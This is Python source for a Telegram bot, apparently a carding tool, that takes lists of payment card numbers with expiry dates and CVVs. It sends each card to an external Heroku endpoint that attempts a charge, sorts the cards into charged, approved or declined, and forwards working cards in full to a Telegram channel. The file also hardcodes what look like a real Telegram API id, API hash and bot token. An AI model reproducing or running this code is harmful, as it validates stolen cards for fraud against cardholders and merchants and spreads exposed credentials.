import asyncio
import json
import requests
import os
from telethon import TelegramClient, events, Button

api_id = '27649783'
api_hash = '834fd6015b50b781e0f8a41876ca95c8'

# Replace YOUR_BOT_TOKEN with your actual Telegram bot token
bot_token = '7386696229:AAEPXkf7KTFYwwu28L43Rpb5E6TGCGWhrag'

REQUEST_DELAY = 5

client = TelegramClient('bots', api_id, api_hash).start(bot_token=bot_token)

CCN_BASE_URL = "https://ugin-376ec3a40d16.herokuapp.com/cvv"
CVV_BASE_URL = "https://ugin-376ec3a40d16.herokuapp.com/cvv"

# List to keep track of approved users
approved_users = set()

admin_ids = {7427691214}

channel_id = -1002196680748

def divide_by_100(amount):
    return amount / 100

# Ensure the results directory exists
RESULTS_DIR = '/mnt/data/results'
os.makedirs(RESULTS_DIR, exist_ok=True)

last_card = None
last_card_response = None

session_results = {}
unique_id_counter = 0

user_stop_events = {}

def generate_unique_id():
    global unique_id_counter
    unique_id_counter += 1
    return f"results{unique_id_counter:03d}"

def reset_user_counts():
    return {
        'charged_cc_count': 0,
        'ok_cc_count': 0,
        'declined_cc_count': 0,
        'checked_cc_count': 0,
        'total_cc_count': 0
    }

@client.on(events.NewMessage(pattern='/add'))
async def add_user(event):
    if event.sender_id in admin_ids:
        parts = event.raw_text.split()
        if len(parts) == 2 and parts[1].isdigit():
            user_id = int(parts[1])
            approved_users.add(user_id)
            await event.reply(f"User {user_id} has been approved.")
        else:
            await event.reply("Usage: /add <user_id>")
    else:
        await event.reply("You are not authorized to use this command.")

@client.on(events.NewMessage(pattern='/remove'))
async def remove_user(event):
    if event.sender_id in admin_ids:
        parts = event.raw_text.split()
        if len(parts) == 2 and parts[1].isdigit():
            user_id = int(parts[1])
            if user_id in approved_users:
                approved_users.remove(user_id)
                await event.reply(f"User {user_id} has been removed from the approved list.")
            else:
                await event.reply(f"User {user_id} is not in the approved list.")
        else:
            await event.reply("Usage: /remove <user_id>")
    else:
        await event.reply("You are not authorized to use this command.")

@client.on(events.NewMessage(pattern='/users'))
async def list_users(event):
    if event.sender_id in admin_ids:
        if approved_users:
            user_list = "\n".join(map(str, approved_users))
            await event.reply(f"Approved users:\n{user_list}")
        else:
            await event.reply("No users have been approved yet.")
    else:
        await event.reply("You are not authorized to use this command.")

@client.on(events.NewMessage(pattern='/get'))
async def get_declined_cards(event):
    parts = event.raw_text.split()
    if len(parts) == 2:
        unique_id = parts[1]
        if unique_id in session_results:
            file_path = os.path.join(RESULTS_DIR, f'results_{unique_id}.txt')
            with open(file_path, 'w') as f:
                for result in session_results[unique_id]:
                    f.write(result + "\n")
            await event.client.send_file(event.chat_id, file_path, caption="Results")
        else:
            await event.reply("No results available for the given ID.")
    else:
        await event.reply("Usage: /get <unique_id>")

async def check_approval_and_respond(event):
    """Check if the user is approved before proceeding."""
    if event.sender_id not in approved_users and event.sender_id not in admin_ids:
        await event.reply("You need to be approved by the admin to use this bot.")
        return False
    return True

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    if not await check_approval_and_respond(event):
        return
    await event.reply("Welcome to CC Checker bot\n\n- Hit /cmds for my commands ✨", reply_to=event)

@client.on(events.NewMessage(pattern='/cmds'))
async def cmds(event):
    if not await check_approval_and_respond(event):
        return
    await event.reply("✨My commands:\n\n- CCN Checker: \n`/ccn <card_details>`\n- CVV Checker: \n`/cvv <card_details>`\n- To check via file, reply to a text file with `/ccn` or `/cvv`\n- Get results: `/get <unique_id>`\n- Stop current process: `/stop`", reply_to=event)

@client.on(events.NewMessage(pattern='/ccn'))
async def ccn_check(event):
    if not await check_approval_and_respond(event):
        return
    
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.file and reply_msg.file.mime_type == 'text/plain':
            file_content = (await reply_msg.download_media(bytes)).decode('utf-8')
            card_details = [line.strip() for line in file_content.splitlines() if line.strip()]
        else:
            await event.reply("Please reply to a text file containing card details.")
            return
    else:
        card_details = event.raw_text.split()[1:]

    user_counts = reset_user_counts()
    user_counts['total_cc_count'] = len(card_details)
    unique_id = generate_unique_id()
    session_results[unique_id] = []

    # Initialize stop event for the user
    user_stop_events[event.sender_id] = asyncio.Event()

    await process_card(event, CCN_BASE_URL, card_details, "𝐂𝐂𝐍", unique_id, user_counts)

@client.on(events.NewMessage(pattern='/cvv'))
async def cvv_check(event):
    if not await check_approval_and_respond(event):
        return
    
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.file and reply_msg.file.mime_type == 'text/plain':
            file_content = (await reply_msg.download_media(bytes)).decode('utf-8')
            card_details = [line.strip() for line in file_content.splitlines() if line.strip()]
        else:
            await event.reply("Please reply to a text file containing card details.")
            return
    else:
        card_details = event.raw_text.split()[1:]

    user_counts = reset_user_counts()
    user_counts['total_cc_count'] = len(card_details)
    unique_id = generate_unique_id()
    session_results[unique_id] = []

    # Initialize stop event for the user
    user_stop_events[event.sender_id] = asyncio.Event()

    await process_card(event, CVV_BASE_URL, card_details, "𝐂𝐕𝐕", unique_id, user_counts)

@client.on(events.NewMessage(pattern='/stop'))
async def stop(event):
    if event.sender_id in approved_users or event.sender_id in admin_ids:
        if event.sender_id in user_stop_events:
            user_stop_events[event.sender_id].set()  # Set the event to stop the current process for this user
            await event.reply("Stopping the current process for you...")
        else:
            await event.reply("No ongoing process found for you.")
    else:
        await event.reply("You are not authorized to use this command.")

async def process_card(event, base_url, card_details, check_type, unique_id, user_counts):
    global last_card, last_card_response
    declined_cards = []  # Define declined_cards within the function
    sender = await event.get_sender()
    first_name = sender.first_name
    message = await event.reply("𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐂 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠...")

    for card in card_details:
        if user_stop_events[event.sender_id].is_set():
            await event.reply("Process has been stopped by you.")
            break

        card_info = card.split("|")
        if len(card_info) != 4:
            await event.reply(f"⚠ Invalid card details format for `{card}`.\nSkipping this card...", link_preview=False)
            continue

        last_card = card
        card_number, expiry_month, expiry_year, cvv = card_info
        API_URL = f"{base_url}?cc={card_number}|{expiry_month}|{expiry_year}|{cvv}"

        response = await client.loop.run_in_executor(None, requests.get, API_URL)

        try:
            response_data = json.loads(response.text)
            if response_data.get("status") == "succeeded":
                amount = response_data.get('amount', 0)
                divided_amount = divide_by_100(amount)
                last_card_response = f"Payment Successful! Amount: {divided_amount} {response_data.get('currency', '')}"
                success_message = (f"┏━━━━━━━⍟\n"
                                   f"┃ {check_type} 𝐂𝐇𝐀𝐑𝐆𝐄 15$ ✅\n"
                                   f"┗━━━━━━━━━━━⊛\n"
                                   f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
                                   f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *Payment Successful!✅*\n"
                                   f"➩ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗶𝗻𝘁𝗲𝗻𝘁 𝗜𝗗: `{response_data.get('id', '')}`\n"
                                   f"➩ 𝗔𝗺𝗼𝘂𝗻𝘁: `{divided_amount}` `{response_data.get('currency', '')}`\n\n"
                                   f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
                buttons = [
                    [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
                ]
                await event.reply(success_message, buttons=buttons, link_preview=False)
                await client.send_message(channel_id, success_message, buttons=buttons, link_preview=False)
                user_counts['charged_cc_count'] += 1
                session_results[unique_id].append(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅: {card}")

            else:
                error_data = response_data.get("error")
                if error_data:
                    decline_reason = error_data.get("decline_code", "")
                    amount = error_data.get("amount", 0)
                    divided_amount = divide_by_100(amount)
                    message_text = error_data.get("message", "Unknown Error")
                    currency = error_data.get("currency", "")
                    status = error_data.get("status", "")

                    if message_text == "Your card's security code is incorrect." or decline_reason in ["incorrect_cvc", "insufficient_funds", "transaction_not_allowed"]:
                        ok_cc_message = (f"┏━━━━━━━⍟\n"
                                         f"┃ {check_type} 𝐂𝐇𝐀𝐑𝐆𝐄 15$ ✅\n"
                                         f"┗━━━━━━━━━━━⊛\n"
                                         f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
                                         f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *APPROVED CARD*\n"
                                         f"➩ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲 𝗥𝗲𝗮𝘀𝗼𝗻: `{decline_reason}`\n"
                                         f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: `{message_text}`\n\n"
                                         f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
                        buttons = [
                            [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
                        ]
                        await event.reply(ok_cc_message, buttons=buttons, link_preview=False)
                        await client.send_message(channel_id, ok_cc_message, buttons=buttons, link_preview=False)
                        user_counts['ok_cc_count'] += 1
                        session_results[unique_id].append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")
                    else:
                        last_card_response = f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message_text}"
                        declined_cards.append((card, last_card_response))
                        user_counts['declined_cc_count'] += 1
                        session_results[unique_id].append(last_card_response)
                else:
                    decline_reason = response_data.get("decline_code", "")
                    amount = response_data.get("amount", 0)
                    divided_amount = divide_by_100(amount)
                    message_text = response_data.get("message", "Unknown Error")
                    currency = response_data.get("currency", "")
                    status = response_data.get("status", "")

                    if message_text == "Your card's security code is incorrect." or decline_reason in ["incorrect_cvc", "insufficient_funds", "transaction_not_allowed"]:
                        ok_cc_message = (f"┏━━━━━━━⍟\n"
                                         f"┃ {check_type} 𝐂𝐇𝐀𝐑𝐆𝐄 15$ ✅\n"
                                         f"┗━━━━━━━━━━━⊛\n"
                                         f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
                                         f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *APPROVED CC*\n"
                                         f"➩ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲 𝗥𝗲𝗮𝘀𝗼𝗻:`{decline_reason}`\n"
                                         f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: `{message_text}`\n\n"
                                         f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
                        buttons = [
                            [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
                        ]
                        await event.reply(ok_cc_message, buttons=buttons, link_preview=False)
                        await client.send_message(channel_id, ok_cc_message, buttons=buttons, link_preview=False)
                        user_counts['ok_cc_count'] += 1
                        session_results[unique_id].append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")
                    else:
                        last_card_response = f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message_text}"
                        declined_cards.append((card, last_card_response))
                        user_counts['declined_cc_count'] += 1
                        session_results[unique_id].append(last_card_response)

            user_counts['checked_cc_count'] += 1

            update_msg = (f"{last_card_response}\n"
                          f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
                          f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
                          f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
                          f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n"
                          f"𝐆𝐞𝐭 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐛𝐲 /get {unique_id}")
            buttons = [
                [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
            ]
            await message.edit(update_msg, buttons=buttons)

        except json.JSONDecodeError:
            last_card_response = f"Failed to decode response for {card}.\nResponse text: {response.text}"
            declined_cards.append((card, last_card_response))
            user_counts['declined_cc_count'] += 1
            session_results[unique_id].append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")

            update_msg = (f"{last_card_response}\n"
                          f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
                          f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
                          f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
                          f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n"
                          f"𝐆𝐞𝐭 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐛𝐲 `/get {unique_id}`")
            buttons = [
                [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
            ]
            await message.edit(update_msg, buttons=buttons)

        await asyncio.sleep(REQUEST_DELAY)  # Delay between requests

client.start()
client.run_until_disconnected()
                        
